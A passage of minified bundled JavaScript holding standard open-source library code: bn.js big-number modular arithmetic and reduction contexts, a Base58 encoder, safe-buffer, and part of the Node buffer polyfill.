>0;)a.isOdd()&&a.iadd(u),a.iushrn(1);i.cmp(o)>=0?(i.isub(o),s.isub(a)):(o.isub(i),a.isub(s))}return 0>(e=0===i.cmpn(1)?s:a).cmpn(0)&&e.iadd(t),e},n.prototype.gcd=function(t){if(this.isZero())return t.abs();if(t.isZero())return this.abs();var e=this.clone(),r=t.clone();e.negative=0,r.negative=0;for(var i=0;e.isEven()&&r.isEven();i++)e.iushrn(1),r.iushrn(1);for(;;){for(;e.isEven();)e.iushrn(1);for(;r.isEven();)r.iushrn(1);var n=e.cmp(r);if(n<0){var o=e;e=r,r=o}else if(0===n||0===r.cmpn(1))break;e.isub(r)}return r.iushln(i)},n.prototype.invm=function(t){return this.egcd(t).a.umod(t)},n.prototype.isEven=function(){return(1&this.words[0])==0},n.prototype.isOdd=function(){return(1&this.words[0])==1},n.prototype.andln=function(t){return this.words[0]&t},n.prototype.bincn=function(t){r("number"==typeof t);var e=t%26,i=(t-e)/26,n=1<<e;if(this.length<=i)return this._expand(i+1),this.words[i]|=n,this;for(var o=n,s=i;0!==o&&s<this.length;s++){var a=0|this.words[s];a+=o,o=a>>>26,a&=0x3ffffff,this.words[s]=a}return 0!==o&&(this.words[s]=o,this.length++),this},n.prototype.isZero=function(){return 1===this.length&&0===this.words[0]},n.prototype.cmpn=function(t){var e,i=t<0;if(0!==this.negative&&!i)return -1;if(0===this.negative&&i)return 1;if(this._strip(),this.length>1)e=1;else{i&&(t=-t),r(t<=0x3ffffff,"Number is too big");var n=0|this.words[0];e=n===t?0:n<t?-1:1}return 0!==this.negative?0|-e:e},n.prototype.cmp=function(t){if(0!==this.negative&&0===t.negative)return -1;if(0===this.negative&&0!==t.negative)return 1;var e=this.ucmp(t);return 0!==this.negative?0|-e:e},n.prototype.ucmp=function(t){if(this.length>t.length)return 1;if(this.length<t.length)return -1;for(var e=0,r=this.length-1;r>=0;r--){var i=0|this.words[r],n=0|t.words[r];if(i!==n){i<n?e=-1:i>n&&(e=1);break}}return e},n.prototype.gtn=function(t){return 1===this.cmpn(t)},n.prototype.gt=function(t){return 1===this.cmp(t)},n.prototype.gten=function(t){return this.cmpn(t)>=0},n.prototype.gte=function(t){return this.cmp(t)>=0},n.prototype.ltn=function(t){return -1===this.cmpn(t)},n.prototype.lt=function(t){return -1===this.cmp(t)},n.prototype.lten=function(t){return 0>=this.cmpn(t)},n.prototype.lte=function(t){return 0>=this.cmp(t)},n.prototype.eqn=function(t){return 0===this.cmpn(t)},n.prototype.eq=function(t){return 0===this.cmp(t)},n.red=function(t){return new E(t)},n.prototype.toRed=function(t){return r(!this.red,"Already a number in reduction context"),r(0===this.negative,"red works only with positives"),t.convertTo(this)._forceRed(t)},n.prototype.fromRed=function(){return r(this.red,"fromRed works only with numbers in reduction context"),this.red.convertFrom(this)},n.prototype._forceRed=function(t){return this.red=t,this},n.prototype.forceRed=function(t){return r(!this.red,"Already a number in reduction context"),this._forceRed(t)},n.prototype.redAdd=function(t){return r(this.red,"redAdd works only with red numbers"),this.red.add(this,t)},n.prototype.redIAdd=function(t){return r(this.red,"redIAdd works only with red numbers"),this.red.iadd(this,t)},n.prototype.redSub=function(t){return r(this.red,"redSub works only with red numbers"),this.red.sub(this,t)},n.prototype.redISub=function(t){return r(this.red,"redISub works only with red numbers"),this.red.isub(this,t)},n.prototype.redShl=function(t){return r(this.red,"redShl works only with red numbers"),this.red.shl(this,t)},n.prototype.redMul=function(t){return r(this.red,"redMul works only with red numbers"),this.red._verify2(this,t),this.red.mul(this,t)},n.prototype.redIMul=function(t){return r(this.red,"redMul works only with red numbers"),this.red._verify2(this,t),this.red.imul(this,t)},n.prototype.redSqr=function(){return r(this.red,"redSqr works only with red numbers"),this.red._verify1(this),this.red.sqr(this)},n.prototype.redISqr=function(){return r(this.red,"redISqr works only with red numbers"),this.red._verify1(this),this.red.isqr(this)},n.prototype.redSqrt=function(){return r(this.red,"redSqrt works only with red numbers"),this.red._verify1(this),this.red.sqrt(this)},n.prototype.redInvm=function(){return r(this.red,"redInvm works only with red numbers"),this.red._verify1(this),this.red.invm(this)},n.prototype.redNeg=function(){return r(this.red,"redNeg works only with red numbers"),this.red._verify1(this),this.red.neg(this)},n.prototype.redPow=function(t){return r(this.red&&!t.red,"redPow(normalNum)"),this.red._verify1(this),this.red.pow(this,t)};var w={k256:null,p224:null,p192:null,p25519:null};function v(t,e){this.name=t,this.p=new n(e,16),this.n=this.p.bitLength(),this.k=new n(1).iushln(this.n).isub(this.p),this.tmp=this._tmp()}function x(){v.call(this,"k256","ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f")}function k(){v.call(this,"p224","ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001")}function S(){v.call(this,"p192","ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff")}function B(){v.call(this,"25519","7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed")}function E(t){if("string"==typeof t){var e=n._prime(t);this.m=e.p,this.prime=e}else r(t.gtn(1),"modulus must be greater than 1"),this.m=t,this.prime=null}function A(t){E.call(this,t),this.shift=this.m.bitLength(),this.shift%26!=0&&(this.shift+=26-this.shift%26),this.r=new n(1).iushln(this.shift),this.r2=this.imod(this.r.sqr()),this.rinv=this.r._invmp(this.m),this.minv=this.rinv.mul(this.r).isubn(1).div(this.m),this.minv=this.minv.umod(this.r),this.minv=this.r.sub(this.minv)}v.prototype._tmp=function(){var t=new n(null);return t.words=Array(Math.ceil(this.n/13)),t},v.prototype.ireduce=function(t){var e,r=t;do this.split(r,this.tmp),e=(r=(r=this.imulK(r)).iadd(this.tmp)).bitLength();while(e>this.n)var i=e<this.n?-1:r.ucmp(this.p);return 0===i?(r.words[0]=0,r.length=1):i>0?r.isub(this.p):void 0!==r.strip?r.strip():r._strip(),r},v.prototype.split=function(t,e){t.iushrn(this.n,0,e)},v.prototype.imulK=function(t){return t.imul(this.k)},i(x,v),x.prototype.split=function(t,e){for(var r=Math.min(t.length,9),i=0;i<r;i++)e.words[i]=t.words[i];if(e.length=r,t.length<=9){t.words[0]=0,t.length=1;return}var n=t.words[9];for(i=10,e.words[e.length++]=4194303&n;i<t.length;i++){var o=0|t.words[i];t.words[i-10]=(4194303&o)<<4|n>>>22,n=o}n>>>=22,t.words[i-10]=n,0===n&&t.length>10?t.length-=10:t.length-=9},x.prototype.imulK=function(t){t.words[t.length]=0,t.words[t.length+1]=0,t.length+=2;for(var e=0,r=0;r<t.length;r++){var i=0|t.words[r];e+=977*i,t.words[r]=0x3ffffff&e,e=64*i+(e/0x4000000|0)}return 0===t.words[t.length-1]&&(t.length--,0===t.words[t.length-1]&&t.length--),t},i(k,v),i(S,v),i(B,v),B.prototype.imulK=function(t){for(var e=0,r=0;r<t.length;r++){var i=(0|t.words[r])*19+e,n=0x3ffffff&i;i>>>=26,t.words[r]=n,e=i}return 0!==e&&(t.words[t.length++]=e),t},n._prime=function(t){var e;if(w[t])return w[t];if("k256"===t)e=new x;else if("p224"===t)e=new k;else if("p192"===t)e=new S;else if("p25519"===t)e=new B;else throw Error("Unknown prime "+t);return w[t]=e,e},E.prototype._verify1=function(t){r(0===t.negative,"red works only with positives"),r(t.red,"red works only with red numbers")},E.prototype._verify2=function(t,e){r((t.negative|e.negative)==0,"red works only with positives"),r(t.red&&t.red===e.red,"red works only with red numbers")},E.prototype.imod=function(t){return this.prime?this.prime.ireduce(t)._forceRed(this):(u(t,t.umod(this.m)._forceRed(this)),t)},E.prototype.neg=function(t){return t.isZero()?t.clone():this.m.sub(t)._forceRed(this)},E.prototype.add=function(t,e){this._verify2(t,e);var r=t.add(e);return r.cmp(this.m)>=0&&r.isub(this.m),r._forceRed(this)},E.prototype.iadd=function(t,e){this._verify2(t,e);var r=t.iadd(e);return r.cmp(this.m)>=0&&r.isub(this.m),r},E.prototype.sub=function(t,e){this._verify2(t,e);var r=t.sub(e);return 0>r.cmpn(0)&&r.iadd(this.m),r._forceRed(this)},E.prototype.isub=function(t,e){this._verify2(t,e);var r=t.isub(e);return 0>r.cmpn(0)&&r.iadd(this.m),r},E.prototype.shl=function(t,e){return this._verify1(t),this.imod(t.ushln(e))},E.prototype.imul=function(t,e){return this._verify2(t,e),this.imod(t.imul(e))},E.prototype.mul=function(t,e){return this._verify2(t,e),this.imod(t.mul(e))},E.prototype.isqr=function(t){return this.imul(t,t.clone())},E.prototype.sqr=function(t){return this.mul(t,t)},E.prototype.sqrt=function(t){if(t.isZero())return t.clone();var e=this.m.andln(3);if(r(e%2==1),3===e){var i=this.m.add(new n(1)).iushrn(2);return this.pow(t,i)}for(var o=this.m.subn(1),s=0;!o.isZero()&&0===o.andln(1);)s++,o.iushrn(1);r(!o.isZero());var a=new n(1).toRed(this),u=a.redNeg(),l=this.m.subn(1).iushrn(1),c=this.m.bitLength();for(c=new n(2*c*c).toRed(this);0!==this.pow(c,l).cmp(u);)c.redIAdd(u);for(var h=this.pow(c,o),f=this.pow(t,o.addn(1).iushrn(1)),d=this.pow(t,o),p=s;0!==d.cmp(a);){for(var g=d,m=0;0!==g.cmp(a);m++)g=g.redSqr();r(m<p);var y=this.pow(h,new n(1).iushln(p-m-1));f=f.redMul(y),h=y.redSqr(),d=d.redMul(h),p=m}return f},E.prototype.invm=function(t){var e=t._invmp(this.m);return 0!==e.negative?(e.negative=0,this.imod(e).redNeg()):this.imod(e)},E.prototype.pow=function(t,e){if(e.isZero())return new n(1).toRed(this);if(0===e.cmpn(1))return t.clone();var r=Array(16);r[0]=new n(1).toRed(this),r[1]=t;for(var i=2;i<r.length;i++)r[i]=this.mul(r[i-1],t);var o=r[0],s=0,a=0,u=e.bitLength()%26;for(0===u&&(u=26),i=e.length-1;i>=0;i--){for(var l=e.words[i],c=u-1;c>=0;c--){var h=l>>c&1;if(o!==r[0]&&(o=this.sqr(o)),0===h&&0===s){a=0;continue}s<<=1,s|=h,(4==++a||0===i&&0===c)&&(o=this.mul(o,r[s]),a=0,s=0)}u=26}return o},E.prototype.convertTo=function(t){var e=t.umod(this.m);return e===t?e.clone():e},E.prototype.convertFrom=function(t){var e=t.clone();return e.red=null,e},n.mont=function(t){return new A(t)},i(A,E),A.prototype.convertTo=function(t){return this.imod(t.ushln(this.shift))},A.prototype.convertFrom=function(t){var e=this.imod(t.mul(this.rinv));return e.red=null,e},A.prototype.imul=function(t,e){if(t.isZero()||e.isZero())return t.words[0]=0,t.length=1,t;var r=t.imul(e),i=r.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),n=r.isub(i).iushrn(this.shift),o=n;return n.cmp(this.m)>=0?o=n.isub(this.m):0>n.cmpn(0)&&(o=n.iadd(this.m)),o._forceRed(this)},A.prototype.mul=function(t,e){if(t.isZero()||e.isZero())return new n(0)._forceRed(this);var r=t.mul(e),i=r.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),o=r.isub(i).iushrn(this.shift),s=o;return o.cmp(this.m)>=0?s=o.isub(this.m):0>o.cmpn(0)&&(s=o.iadd(this.m)),s._forceRed(this)},A.prototype.invm=function(t){return this.imod(t._invmp(this.m).mul(this.r2))._forceRed(this)}}(t,this)}),h("kjyEk",function(t,e){}),h("bYkMz",function(t,e){var r=c("0DhcF");t.exports=r("123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz")}),h("0DhcF",function(t,e){var r=c("1U9GM").Buffer;t.exports=function(t){if(t.length>=255)throw TypeError("Alphabet too long");for(var e=new Uint8Array(256),i=0;i<e.length;i++)e[i]=255;for(var n=0;n<t.length;n++){var o=t.charAt(n),s=o.charCodeAt(0);if(255!==e[s])throw TypeError(o+" is ambiguous");e[s]=n}var a=t.length,u=t.charAt(0),l=Math.log(a)/Math.log(256),c=Math.log(256)/Math.log(a);function h(t){if("string"!=typeof t)throw TypeError("Expected String");if(0===t.length)return r.alloc(0);for(var i=0,n=0,o=0;t[i]===u;)n++,i++;for(var s=(t.length-i)*l+1>>>0,c=new Uint8Array(s);i<t.length;){var h=e[t.charCodeAt(i)];if(255===h)return;for(var f=0,d=s-1;(0!==h||f<o)&&-1!==d;d--,f++)h+=a*c[d]>>>0,c[d]=h%256>>>0,h=h/256>>>0;if(0!==h)throw Error("Non-zero carry");o=f,i++}for(var p=s-o;p!==s&&0===c[p];)p++;var g=r.allocUnsafe(n+(s-p));g.fill(0,0,n);for(var m=n;p!==s;)g[m++]=c[p++];return g}return{encode:function(e){if((Array.isArray(e)||e instanceof Uint8Array)&&(e=r.from(e)),!r.isBuffer(e))throw TypeError("Expected Buffer");if(0===e.length)return"";for(var i=0,n=0,o=0,s=e.length;o!==s&&0===e[o];)o++,i++;for(var l=(s-o)*c+1>>>0,h=new Uint8Array(l);o!==s;){for(var f=e[o],d=0,p=l-1;(0!==f||d<n)&&-1!==p;p--,d++)f+=256*h[p]>>>0,h[p]=f%a>>>0,f=f/a>>>0;if(0!==f)throw Error("Non-zero carry");n=d,o++}for(var g=l-n;g!==l&&0===h[g];)g++;for(var m=u.repeat(i);g<l;++g)m+=t.charAt(h[g]);return m},decodeUnsafe:h,decode:function(t){var e=h(t);if(e)return e;throw Error("Non-base"+a+" character")}}}}),h("1U9GM",function(t,e){/*! safe-buffer. MIT License. Feross Aboukhadijeh <https://feross.org/opensource> */var r=c("6ZWSX"),i=r.Buffer;function n(t,e){for(var r in t)e[r]=t[r]}function o(t,e,r){return i(t,e,r)}i.from&&i.alloc&&i.allocUnsafe&&i.allocUnsafeSlow?t.exports=r:(n(r,t.exports),t.exports.Buffer=o),o.prototype=Object.create(i.prototype),n(i,o),o.from=function(t,e,r){if("number"==typeof t)throw TypeError("Argument must not be a number");return i(t,e,r)},o.alloc=function(t,e,r){if("number"!=typeof t)throw TypeError("Argument must be a number");var n=i(t);return void 0!==e?"string"==typeof r?n.fill(e,r):n.fill(e):n.fill(0),n},o.allocUnsafe=function(t){if("number"!=typeof t)throw TypeError("Argument must be a number");return i(t)},o.allocUnsafeSlow=function(t){if("number"!=typeof t)throw TypeError("Argument must be a number");return r.SlowBuffer(t)}}),h("6ZWSX",function(e,r){t(e.exports,"Buffer",()=>i,t=>i=t),t(e.exports,"SlowBuffer",()=>n,t=>n=t),t(e.exports,"INSPECT_MAX_BYTES",()=>o,t=>o=t),t(e.exports,"kMaxLength",()=>s,t=>s=t);var i,n,o,s,a=c("kuxul"),u=c("9NvM5");let l="function"==typeof Symbol&&"function"==typeof Symbol.for?Symbol.for("nodejs.util.inspect.custom"):null;function h(t){if(t>0x7fffffff)throw RangeError('The value "'+t+'" is invalid for option "size"');let e=new Uint8Array(t);return Object.setPrototypeOf(e,f.prototype),e}function f(t,e,r){if("number"==typeof t){if("string"==typeof e)throw TypeError('The "string" argument must be of type string. Received type number');return g(t)}return d(t,e,r)}function d(t,e,r){if("string"==typeof t)return function(t,e){if(("string"!=typeof e||""===e)&&(e="utf8"),!f.isEncoding(e))throw TypeError("Unknown encoding: "+e);let r=0|w(t,e),i=h(r),n=i.write(t,e);return n!==r&&(i=i.slice(0,n)),i}(t,e);if(ArrayBuffer.isView(t))return function(t){if(F(t,Uint8Array)){let e=new Uint8Array(t);return y(e.buffer,e.byteOffset,e.byteLength)}return m(t)}(t);if(null==t)throw TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type "+typeof t);if(F(t,ArrayBuffer)||t&&F(t.buffer,ArrayBuffer)||"undefined"!=typeof SharedArrayBuffer&&(F(t,SharedArrayBuffer)||t&&F(t.buffer,SharedArrayBuffer)))return y(t,e,r);if("number"==typeof t)throw TypeError('The "value" argument must not be of type number. Received type number');let i=t.valueOf&&t.valueOf();if(null!=i&&i!==t)return f.from(i,e,r);let n=function(t){var e;if(f.isBuffer(t)){let e=0|b(t.length),r=h(e);return 0===r.length||t.copy(r,0,0,e),r}return void 0!==t.length?"number"!=typeof t.length||(e=t.length)!=e?h(0):m(t):"Buffer"===t.type&&Array.isArray(t.data)?m(t.data):void 0}(t);if(n)return n;if("undefined"!=typeof Symbol&&null!=Symbol.toPrimitive&&"function"==typeof t[Symbol.toPrimitive])return f.from(t[Symbol.toPrimitive]("string"),e,r);throw TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type "+typeof t)}function p(t){if("number"!=typeof t)throw TypeError('"size" argument must be of type number');if(t<0)throw RangeError('The value "'+t+'" is invalid for option "size"')}function g(t){return p(t),h(t<0?0:0|b(t))}function m(t){let e=t.length<0?0:0|b(t.length),r=h(e);for(let i=0;i<e;i+=1)r[i]=255&t[i];return r}function y(t,e,r){let i;if(e<0||t.byteLength<e)throw RangeError('"offset" is outside of buffer bounds');if(t.byteLength<e+(r||0))throw RangeError('"length" is outside of buffer bounds');return Object.setPrototypeOf(i=void 0===e&&void 0===r?new Uint8Array(t):void 0===r?new Uint8Array(t,e):new Uint8Array(t,e,r),f.prototype),i}function b(t){if(t>=0x7fffffff)throw RangeError("Attempt to allocate Buffer larger than maximum size: 0x7fffffff bytes");return 0|t}function w(t,e){if(f.isBuffer(t))return t.length;if(ArrayBuffer.isView(t)||F(t,ArrayBuffer))return t.byteLength;if("string"!=typeof t)throw TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type '+typeof t);let r=t.length,i=arguments.length>2&&!0===arguments[2];if(!i&&0===r)return 0;let n=!1;for(;;)switch(e){case"ascii":case"latin1":case"binary":return r;case"utf8":case"utf-8":return H(t).length;case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return 2*r;case"hex":return r>>>1;case"base64":return q(t).length;default:if(n)return i?-1:H(t).length;e=(""+e).toLowerCase(),n=!0}}function v(t,e,r){let i=!1;if((void 0===e||e<0)&&(e=0),e>this.length||((void 0===r||r>this.length)&&(r=this.length),r<=0||(r>>>=0)<=(e>>>=0)))return"";for(t||(t="utf8");;)switch(t){case"hex":return function(t,e,r){let i=t.length;(!e||e<0)&&(e=0),(!r||r<0||r>i)&&(r=i);let n="";for(let i=e;i<r;++i)n+=D[t[i]];return n}(this,e,r);case"utf8":case"utf-8":return B(this,e,r);case"ascii":return function(t,e,r){let i="";r=Math.min(t.length,r);for(let n=e;n<r;++n)i+=String.fromCharCode(127&t[n]);return i}(this,e,r);case"latin1":case"binary":return function(t,e,r){let i="";r=Math.min(t.length,r);for(let n=e;n<r;++n)i+=String.fromCharCode(t[n]);return i}(this,e,r);case"base64":var n,o;return n=e,o=r,0===n&&o===this.length?a.fromByteArray(this):a.fromByteArray(this.slice(n,o));case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return function(t,e,r){let i=t.slice(e,r),n="";for(let t=0;t<i.length-1;t+=2)n+=String.fromCharCode(i[t]+256*i[t+1]);return n}(this,e,r);default:if(i)throw TypeError("Unknown encoding: "+t);t=(t+"").toLowerCase(),i=!0}}function x(t,e,r){let i=t[e];t[e]=t[r],t[r]=i}function k(t,e,r,i,n){var o;if(0===t.length)return -1;if("string"==typeof r?(i=r,r=0):r>0x7fffffff?r=0x7fffffff:r<-0x80000000&&(r=-0x80000000),(o=r=+r)!=o&&(r=n?0:t.length-1),r<0&&(r=t.length+r),r>=t.length){if(n)return -1;r=t.length-1}else if(r<0){if(!n)return -1;r=0}if("string"==typeof e&&(e=f.from(e,i)),f.isBuffer(e))return 0===e.length?-1:S(t,e,r,i,n);if("number"==typeof e)return(e&=255,"function"==typeof Uint8Array.prototype.indexOf)?n?Uint8Array.prototype.indexOf.call(t,e,r):Uint8Array.prototype.lastIndexOf.call(t,e,r):S(t,[e],r,i,n);throw TypeError("val must be string, number or Buffer")}function S(t,e,r,i,n){let o,s=1,a=t.length,u=e.length;if(void 0!==i&&("ucs2"===(i=String(i).toLowerCase())||"ucs-2"===i||"utf16le"===i||"utf-16le"===i)){if(t.length<2||e.length<2)return -1;s=2,a/=2,u/=2,r/=2}function l(t,e){return 1===s?t[e]:t.readUInt16BE(e*s)}if(n){let i=-1;for(o=r;o<a;o++)if(l(t,o)===l(e,-1===i?0:o-i)){if(-1===i&&(i=o),o-i+1===u)return i*s}else -1!==i&&(o-=o-i),i=-1}else for(r+u>a&&(r=a-u),o=r;o>=0;o--){let r=!0;for(let i=0;i<u;i++)if(l(t,o+i)!==l(e,i)){r=!1;break}if(r)return o}return -1}function B(t,e,r){r=Math.min(t.length,r);let i=[],n=e;for(;n<r;){let e=t[n],o=null,s=e>239?4:e>223?3:e>191?2:1;if(n+s<=r){let r,i,a,u;switch(s){case 1:e<128&&(o=e);break;case 2:(192&(r=t[n+1]))==128&&(u=(31&e)<<6|63&r)>127&&(o=u);break;case 3:r=t[n+1],i=t[n+2],(192&r)==128&&(192&i)==128&&(u=(15&e)<<12|(63&r)<<6|63&i)>2047&&(u<55296||u>57343)&&(o=u);break;case 4:r=t[n+1],i=t[n+2],a=t[n+3],(192&r)==128&&(192&i)==128&&(192&a)==128&&(u=(15&e)<<18|(63&r)<<12|(63&i)<<6|63&a)>65535&&u<1114112&&(o=u)}}null===o?(o=65533,s=1):o>65535&&(o-=65536,i.push(o>>>10&1023|55296),o=56320|1023&o),i.push(o),n+=s}return function(t){let e=t.length;if(e<=4096)return String.fromCharCode.apply(String,t);let r="",i=0;for(;i<e;)r+=String.fromCharCode.apply(String,t.slice(i,i+=4096));return r}(i)}function E(t,e,r){if(t%1!=0||t<0)throw RangeError("offset is not uint");if(t+e>r)throw RangeError("Trying to access beyond buffer length")}function A(t,e,r,i,n,o){if(!f.isBuffer(t))throw TypeError('"buffer" argument must be a Buffer instance');if(e>n||e<o)throw RangeError('"value" argument is out of bounds');if(r+i>t.length)throw RangeError("Index out of range")}function _(t,e,r,i,n){C(e,i,n,t,r,7);let o=Number(e&BigInt(0xffffffff));t[r++]=o,o>>=8,t[r++]=o,o>>=8,t[r++]=o,o>>=8,t[r++]=o;let s=Number(e>>BigInt(32)&BigInt(0xffffffff));return t[r++]=s,s>>=8,t[r++]=s,s>>=8,t[r++]=s,s>>=8,t[r++]=s,r}function I(t,e,r,i,n){C(e,i,n,t,r,7);let o=Number(e&BigInt(0xffffffff));t[r+7]=o,o>>=8,t[r+6]=o,o>>=8,t[r+5]=o,o>>=8,t[r+4]=o;let s=Number(e>>BigInt(32)&BigInt(0xffffffff));return t[r+3]=s,s>>=8,t[r+2]=s,s>>=8,t[r+1]=s,s>>=8,t[r]=s,r+8}function M(t,e,r,i,n,o){if(r+i>t.length||r<0)throw RangeError("Index out of range")}function L(t,e,r,i,n){return e=+e,r>>>=0,n||M(t,e,r,4,34028234663852886e22,-34028234663852886e22),u.write(t,e,r,i,23,4),r+4}function T(t,e,r,i,n){return e=+e,r>>>=0,n||M(t,e,r,8,17976931348623157e292,-17976931348623157e292),u.write(t,e,r,i,52,8),r+8}i=f,n=function(t){return+t!=t&&(t=0),f.alloc(+t)},o=50,s=0x7fffffff,f.TYPED_ARRAY_SUPPORT=function(){try{let t=new Uint8Array(1),e={foo:function(){return 42}};return Object.setPrototypeOf(e,Uint8Array.prototype),Object.setPrototypeOf(t,e),42===t.foo()}catch(t){return!1}}(),f.TYPED_ARRAY_SUPPORT||"undefined"==typeof console||"function"!=typeof console.error||console.error("This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support."),Object.defineProperty(f.prototype,"parent",{enumerable:!0,get:function(){if(f.isBuffer(this))return this.buffer}}),Object.defineProperty(f.prototype,"offset",{enumerable:!0,get:function(){if(f.isBuffer(this))return this.byteOffset}}),f.poolSize=8192,f.from=function(t,e,r){return d(t,e,r)},Object.setPrototypeOf(f.prototype,Uint8Array.prototype),Object.setPrototypeOf(f,Uint8Array),f.alloc=function(t,e,r){return(p(t),t<=0)?h(t):void 0!==e?"string"==typeof r?h(t).fill(e,r):h(t).fill(e):h(t)},f.allocUnsafe=function(t){return g(t)},f.allocUnsafeSlow=function(t){return g(t)},f.isBuffer=function(t){return null!=t&&!0===t._isBuffer&&t!==f.prototype},f.compare=function(t,e){if(F(t,Uint8Array)&&(t=f.from(t,t.offset,t.byteLength)),F(e,Uint8Array)&&(e=f.from(e,e.offset,e.byteLength)),!f.isBuffer(t)||!f.isBuffer(e))throw TypeError('The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array');if(t===e)return 0;let r=t.length,i=e.length;for(let n=0,o=Math.min(r,i);n<o;++n)if(t[n]!==e[n]){r=t[n],i=e[n];break}return r<i?-1:i<r?1:0},f.isEncoding=function(t){switch(String(t).toLowerCase()){case"hex":case"utf8":case"utf-8":case"ascii":case"latin1":case"binary":case"base64":case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return!0;default:return!1}},f.concat=function(t,e){let r;if(!Array.isArray(t))throw TypeError('"list" argument must be an Array of Buffers');if(0===t.length)return f.alloc(0);if(void 0===e)for(r=0,e=0;r<t.length;++r)e+=t[r].length;let i=f.allocUnsafe(e),n=0;for(r=0;r<t.length;++r){let e=t[r];if(F(e,Uint8Array))n+e.length>i.length?(f.isBuffer(e)||(e=f.from(e)),e.copy(i,n)):Uint8Array.prototype.set.call(i,e,n);else if(f.isBuffer(e))e.copy(i,n);else throw TypeError('"list" argument must be an Array of Buffers');n+=e.length}return i},f.byteLength=w,f.prototype._isBuffer=!0,f.prototype.swap16=function(){let t=this.length;if(t%2!=0)throw RangeError("Buffer size must be a multiple of 16-bits");for(let e=0;e<t;e+=2)x(this,e,e+1);return this},f.prototype.swap32=function(){let t=this.length;if(t%4!=0)throw RangeError("Buffer size must be a multiple of 32-bits");for(let e=0;e<t;e+=4)x(this,e,e+3),x(this,e+1,e+2);return this},f.prototype.swap64=function(){let t=this.length;if(t%8!=0)throw RangeError("Buffer size must be a multiple of 64-bits");for(let e=0;e<t;e+=8)x(this,e,e+7),x(this,e+1,e+6),x(this,e+2,e+5),x(this,e+3,e+4);return this},f.prototype.toString=function(){let t=this.length;return 0===t?"":0==arguments.length?B(this,0,t):v.apply(this,arguments)},f.prototype.toLocaleString=f.prototype.toString,f.prototype.equals=function(t){if(!f.isBuffer(t))throw TypeError("Argument must be a Buffer");return this===t||0===f.compare(this,t)},f.prototype.inspect=function(){let t="",e=o;return t=this.toString("hex",0,e).replace(/(.{2})/g,"$1 ").trim(),this.length>e&&(t+=" ... "),"<Buffer "+t+">"},l&&(f.prototype[l]=f.prototype.inspect),f.prototype.compare=function(t,e,r,i,n){if(F(t,Uint8Array)&&(t=f.from(t,t.offset,t.byteLength)),!f.isBuffer(t))throw TypeError('The "target" argument must be one of type Buffer or Uint8Array. Received type '+typeof t);if(void 0===e&&(e=0),void 0===r&&(r=t?t.length:0),void 0===i&&(i=0),void 0===n&&(n=this.length),e<0||r>t.length||i<0||n>this.length)throw RangeError("out of range index");if(i>=n&&e>=r)return 0;if(i>=n)return -1;if(e>=r)return 1;if(e>>>=0,r>>>=0,i>>>=0,n>>>=0,this===t)return 0;let o=n-i,s=r-e,a=Math.min(o,s),u=this.slice(i,n),l=t.slice(e,r);for(let t=0;t<a;++t)if(u[t]!==l[t]){o=u[t],s=l[t];break}return o<s?-1:s<o?1:0},f.prototype.includes=function(t,e,r){return -1!==this.indexOf(t,e,r)},f.prototype.indexOf=function(t,e,r){return k(this,t,e,r,!0)},f.prototype.lastIndexOf=function(t,e,r){return k(this,t,e,r,!1)},f.prototype.write=function(t,e,r,i){var n,o,s,a,u,l,c,h;if(void 0===e)i="utf8",r=this.length,e=0;else if(void 0===r&&"string"==typeof e)i=e,r=this.length,e=0;else if(isFinite(e))e>>>=0,isFinite(r)?(r>>>=0,void 0===i&&(i="utf8")):(i=r,r=void 0);else throw Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");let f=this.length-e;if((void 0===r||r>f)&&(r=f),t.length>0&&(r<0||e<0)||e>this.length)throw RangeError("Attempt to write outside buffer bounds");i||(i="utf8");let d=!1;for(;;)switch(i){case"hex":return function(t,e,r,i){let n;r=Number(r)||0;let o=t.length-r;i?(i=Number(i))>o&&(i=o):i=o;let s=e.length;for(i>s/2&&(i=s/2),n=0;n<i;++n){let i=parseInt(e.substr(2*n,2),16);if(i!=i)break;t[r+n]=i}return n}(this,t,e,r);case"utf8":case"utf-8":return n=e,o=r,W(H(t,this.length-n),this,n,o);case"ascii":case"latin1":case"binary":return s=e,a=r,W(function(t){let e=[];for(let r=0;r<t.length;++r)e.push(255&t.charCodeAt(r));return e}(t),this,s,a);case"base64":return u=e,l=r,W(q(t),this,u,l);case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return c=e,h=r,W(function(t,e){let r,i;let n=[];for(let o=0;o<t.length&&!((e-=2)<0);++o)i=(r=t.charCodeAt(o))>>8,n.push(r%256),n.push(i);return n}(t,this.length-c),this,c,h);default:if(d)throw TypeError("Unknown encoding: "+i);i=(""+i).toLowerCase(),d=!0}},f.prototype.toJSON=function(){return{type:"Buffer",data:Array.prototype.slice.call(this._arr||this,0)}},f.prototype.slice=function(t,e){let r=this.length;t=~~t,e=void 0===e?r:~~e,t<0?(t+=r)<0&&(t=0):t>r&&(t=r),e<0?(e+=r)<0&&(e=0):e>r&&(e=r),e<t&&(e=t);let i=this.subarray(t,e);return Object.setPrototypeOf(i,f.prototype),i},f.prototype.readUintLE=f.prototype.readUIntLE=function(t,e,r){t>>>=0,e>>>=0,r||E(t,e,this.length);let i=this[t],n=1,o=0;for(;++o<e&&(n*=256);)i+=this[t+o]*n;return i},f.prototype.readUintBE=f.prototype.readUIntBE=function(t,e,r){t>>>=0,e>>>=0,r||E(t,e,this.length);let i=this[t+--e],n=1;for(;e>0&&(n*=256);)i+=this[t+--e]*n;return i},f.prototype.readUint8=f.prototype.readUInt8=function(t,e){return t>>>=0,e||E(t,1,this.length),this[t]},f.prototype.readUint16LE=f.prototype.readUInt16LE=function(t,e){return 